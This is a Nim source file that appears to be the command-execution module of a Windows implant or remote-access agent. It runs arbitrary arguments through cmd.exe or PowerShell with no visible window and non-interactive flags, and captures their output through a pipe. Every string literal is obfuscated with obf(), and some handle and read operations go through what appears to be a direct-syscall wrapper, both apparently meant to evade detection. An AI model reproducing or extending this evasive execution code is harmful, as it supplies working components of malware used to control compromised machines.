import ../utils/global
import ../utils/general/strings
from ../utils/winapi/handlers import createProcessW, createPipe, setHandleInformation, getStdHandle, closeHandle, getEnvironmentVariableW, getFileAttributesW
from ../utils/winapi/syscall import readFile, waitForObject, ntCloseHandle
from ../utils/winapi/utils import SECURITY_ATTRIBUTES
import execution/core

const
  startfUseStdHandles = 0x100'u32
  handleFlagInherit = 1'u32
  createNoWindow = 0x08000000'u32
  stdInputHandle = 0xFFFFFFF6'u32
  invalidFileAttributes = 0xFFFFFFFF'u32

type
  ProcessInformation = object
    hProcess*, hThread*: pointer
    dwProcessId*, dwThreadId*: uint32

  StartupInfoW = object
    cb: culong
    reserved: pointer
    desktop: pointer
    title: pointer
    x, y, xSize, ySize: culong
    xCountChars, yCountChars: culong
    fillAttribute: culong
    flags: culong
    showWindow: uint16
    cbReserved2: uint16
    lpReserved2: pointer
    hStdInput, hStdOutput, hStdError: pointer

proc getEnv(name: string): string =
  # Reads an environment variable into a string
  var wname: array[128, uint16]
  var wval: array[512, uint16]
  asciiWide(name, wname)
  let n = getEnvironmentVariableW(addr wname[0], addr wval[0], culong(wval.len))
  if n == 0: return ""
  var buf: array[512, char]
  let l = wtoa(wval, buf)
  if l <= 0: return ""
  result = newString(l)
  copyMem(addr result[0], addr buf[0], l)

proc pathExists(path: string): bool =
  # Checks that the path exists on disk
  var w: array[260, uint16]
  asciiWide(path, w)
  getFileAttributesW(addr w[0]) != invalidFileAttributes

proc setupPipe(hRead, hWrite: ptr pointer): bool =
  # Creates an inherited write pipe and a private read pipe
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 1,
  )
  if createPipe(hRead, hWrite, addr sa, 1024 * 1024) == 0:
    return false
  setHandleInformation(hRead[], handleFlagInherit, 0) != 0

proc readPipeOutput(hRead: pointer; buf: var openArray[char]): int =
  # Reads all pipe bytes into the output buffer
  var pos = 0
  var chunk: array[4096, byte]
  while pos < buf.len:
    let rd = readFile(hRead, addr chunk[0], culong(min(chunk.len, buf.len - pos)))
    if rd == 0: break
    copyMem(addr buf[pos], addr chunk[0], int(rd))
    pos += int(rd)
  pos

proc runCmdLine(cmdLine: string; buf: var openArray[char]): int =
  # Starts a command line and writes its output into the buffer
  if cmdLine.len == 0:
    return writeErr(obf("empty command"), buf)
  if cmdLine.len >= 2048:
    return writeErr(obf("command too long"), buf)

  var hRead, hWrite: pointer
  if not setupPipe(addr hRead, addr hWrite):
    return writeErr(obf("CreatePipe failed"), buf)

  var wcmd: array[2048, uint16]
  asciiWide(cmdLine, wcmd)

  var si: StartupInfoW
  zeroMem(addr si, sizeof(si))
  si.cb = culong sizeof(StartupInfoW)
  si.flags = startfUseStdHandles
  si.hStdInput = getStdHandle(stdInputHandle)
  si.hStdOutput = hWrite
  si.hStdError = hWrite

  var pi: ProcessInformation
  zeroMem(addr pi, sizeof(pi))

  if createProcessW(nil, addr wcmd[0], nil, nil, 1, createNoWindow, nil, nil, addr si, addr pi) == 0:
    discard closeHandle(hWrite)
    discard closeHandle(hRead)
    return writeErr(obf("CreateProcess failed"), buf)

  discard closeHandle(hWrite)
  discard waitForObject(pi.hProcess)
  let n = readPipeOutput(hRead, buf)
  discard ntCloseHandle(pi.hThread)
  discard ntCloseHandle(pi.hProcess)
  discard closeHandle(hRead)
  if n > 0: n
  else: 0

proc run_shell*(args: string; buf: var openArray[char]): int =
  # Main function that runs the args through cmd
  let comspec = getEnv(obf("COMSPEC"))
  let exe = if comspec.len > 0: comspec
            else:
              let sysroot = getEnv(obf("SYSTEMROOT"))
              if sysroot.len > 0: sysroot & obf("\\System32\\cmd.exe")
              else: obf("C:\\Windows\\System32\\cmd.exe")
  runCmdLine(exe & obf(" /c ") & args, buf)

proc run_powershell*(args: string; buf: var openArray[char]): int =
  # Main function that runs the args through powershell
  let sysroot = getEnv(obf("SYSTEMROOT"))
  let base = if sysroot.len > 0: sysroot else: obf("C:\\Windows")
  let path1 = base & obf("\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
  let path2 = base & obf("\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe")
  let exe = if pathExists(path1): path1
            elif pathExists(path2): path2
            else: obf("powershell.exe")
  runCmdLine(exe & obf(" -NoProfile -NonInteractive -Command ") & args, buf)
